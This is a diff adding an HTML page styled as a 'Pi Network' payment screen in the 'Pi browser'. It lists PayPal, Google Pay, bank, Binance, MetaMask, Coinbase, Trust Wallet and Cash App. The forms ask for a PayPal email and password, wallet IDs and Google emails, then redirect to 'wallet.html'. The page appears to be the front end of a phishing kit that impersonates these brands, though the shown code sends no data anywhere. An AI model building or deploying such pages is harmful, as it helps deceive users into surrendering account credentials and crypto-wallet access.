@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Payment – Pi Network</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #ffffff;
+      color: #333;
+      text-align: center;
+    }
+
+    .top-bar {
+      background-color: #6a0dad;
+      color: #fff;
+      padding: 12px 0;
+      font-size: 16px;
+    }
+
+    .welcome {
+      color: #f9b423;
+      font-size: 1.3em;
+      font-weight: 600;
+      margin: 20px 0 10px;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(3, 90px);
+      justify-content: center;
+      gap: 20px 30px;
+      padding: 20px;
+    }
+
+    .option {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 80px;
+      height: 80px;
+      padding: 5px;
+      border-radius: 10px;
+      background-color: #fff;
+      border: 1px solid #eee;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);
+      cursor: pointer;
+      transition: all 0.2s ease-in-out;
+    }
+
+    .option img {
+      width: 26px;
+      height: 26px;
+      object-fit: contain;
+    }
+
+    .label {
+      margin-top: 5px;
+      font-size: 0.7em;
+    }
+
+    .form-section {
+      display: none;
+      background-color: #f9f9f9;
+      padding: 20px;
+      margin: 20px auto;
+      border-radius: 10px;
+      max-width: 400px;
+      width: 90%;
+    }
+
+    select, input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1em;
+    }
+
+    button {
+      margin-top: 15px;
+      padding: 12px 25px;
+      background-color: #6a0dad;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 1em;
+      cursor: pointer;
+    }
+
+    .cta-button {
+      margin: 30px auto;
+      padding: 12px 25px;
+      background-color: #6a0dad;
+      color: white;
+      border: none;
+      font-weight: bold;
+      font-size: 1em;
+      border-radius: 30px;
+      width: 80%;
+      max-width: 300px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top-bar"> Pi Network</div>
+  <div class="welcome">Welcome to the Pi browser</div>
+
+  <!-- Icons Grid -->
+  <div class="grid">
+    <div class="option" onclick="showSection('bank')">
+      <img src="icons/bank.png" alt="Bank"><div class="label">Bank</div>
+    </div>
+    <div class="option" onclick="showSection('googlepay')">
+      <img src="icons/googlepay.png" alt="Google"><div class="label">Google</div>
+    </div>
+    <div class="option" onclick="showSection('paypal')">
+      <img src="icons/PayPal.png" alt="PayPal"><div class="label">PayPal</div>
+    </div>
+    <div class="option" onclick="showSection('trustwallet')">
+      <img src="icons/trustwallet.png" alt="Trust"><div class="label">Trust</div>
+    </div>
+    <div class="option" onclick="showSection('binance')">
+      <img src="icons/binance.png" alt="Binance"><div class="label">Binance</div>
+    </div>
+    <div class="option" onclick="showSection('ewallet')">
+      <img src="icons/ewallet.png" alt="E-Wallet"><div class="label">E-Wallet</div>
+    </div>
+    <div class="option" onclick="showSection('cashapp')">
+      <img src="icons/cashapp.png" alt="Cash App"><div class="label">Cash App</div>
+    </div>
+    <div class="option" onclick="showSection('coinbase')">
+      <img src="icons/coinbase.png" alt="Coinbase"><div class="label">Coinbase</div>
+    </div>
+    <div class="option" onclick="showSection('metamask')">
+      <img src="icons/metamask.png" alt="MetaMask"><div class="label">MetaMask</div>
+    </div>
+  </div>
+
+  <!-- Forms -->
+  <div id="bank" class="form-section">
+    <h3>Select Country & Bank</h3>
+    <select id="country" onchange="loadBanks()">
+      <option value="">Select Country</option>
+      <option value="usa">USA</option>
+      <option value="uk">UK</option>
+      <option value="india">India</option>
+      <option value="canada">Canada</option>
+      <option value="germany">Germany</option>
+      <option value="china">China</option>
+    </select>
+    <select id="bank-list" style="display:none;" onchange="goToWallet()"></select>
+  </div>
+
+  <div id="paypal" class="form-section">
+    <h3>PayPal Login</h3>
+    <input type="email" placeholder="Email">
+    <input type="password" placeholder="Password">
+    <button onclick="goToWallet()">Continue</button>
+  </div>
+
+  <div id="trustwallet" class="form-section">
+    <h3>Trust Wallet</h3>
+    <input type="text" placeholder="Wallet ID">
+    <select>
+      <option>ETH</option>
+      <option>BTC</option>
+      <option>USDT</option>
+    </select>
+    <button onclick="goToWallet()">Connect</button>
+  </div>
+
+  <div id="binance" class="form-section">
+    <h3>Binance Wallet</h3>
+    <input type="text" placeholder="Wallet ID">
+    <select>
+      <option>BNB</option>
+      <option>BTC</option>
+      <option>ETH</option>
+    </select>
+    <button onclick="goToWallet()">Connect</button>
+  </div>
+
+  <div id="metamask" class="form-section">
+    <h3>MetaMask</h3>
+    <input type="text" placeholder="Wallet ID">
+    <select>
+      <option>ETH</option>
+      <option>USDT</option>
+    </select>
+    <button onclick="goToWallet()">Connect</button>
+  </div>
+
+  <div id="coinbase" class="form-section">
+    <h3>Coinbase</h3>
+    <input type="email" placeholder="Email">
+    <select>
+      <option>BTC</option>
+      <option>ETH</option>
+    </select>
+    <button onclick="goToWallet()">Continue</button>
+  </div>
+
+  <div id="cashapp" class="form-section">
+    <h3>Cash App</h3>
+    <input type="text" placeholder="Cash Tag">
+    <button onclick="goToWallet()">Proceed</button>
+  </div>
+
+  <div id="ewallet" class="form-section">
+    <h3>E-Wallet</h3>
+    <input type="text" placeholder="E-Wallet ID">
+    <button onclick="goToWallet()">Proceed</button>
+  </div>
+
+  <div id="googlepay" class="form-section">
+    <h3>Google Pay</h3>
+    <input type="email" placeholder="Google Email">
+    <button onclick="goToWallet()">Proceed</button>
+  </div>
+
+  <button class="cta-button">Explore The Testnet Ecosystem</button>
+
+  <script>
+    const bankList = {
+      usa: ["Chase", "Wells Fargo", "Citi", "US Bank"],
+      uk: ["Barclays", "HSBC", "NatWest"],
+      india: ["SBI", "HDFC", "ICICI"],
+      canada: ["TD", "RBC", "BMO"],
+      germany: ["Deutsche", "Commerzbank"],
+      china: ["ICBC", "Bank of China"]
+    };
+
+    function showSection(id) {
+      document.querySelectorAll('.form-section').forEach(el => {
+        el.style.display = 'none';
+      });
+      document.getElementById(id).style.display = 'block';
+      window.scrollTo({ top: document.getElementById(id).offsetTop - 20, behavior: 'smooth' });
+    }
+
+    function loadBanks() {
+      const country = document.getElementById('country').value;
+      const bankDropdown = document.getElementById('bank-list');
+      bankDropdown.innerHTML = '<option>Select Bank</option>';
+      if (bankList[country]) {
+        bankList[country].forEach(bank => {
+          const opt = document.createElement('option');
+          opt.value = bank;
+          opt.textContent = bank;
+          bankDropdown.appendChild(opt);
+        });
+        bankDropdown.style.display = 'block';
+      } else {
+        bankDropdown.style.display = 'none';
+      }
+    }
+
+    function goToWallet() {
+      window.location.href = 'wallet.html';
+    }
+  </script>
+
+</body>
+</html>
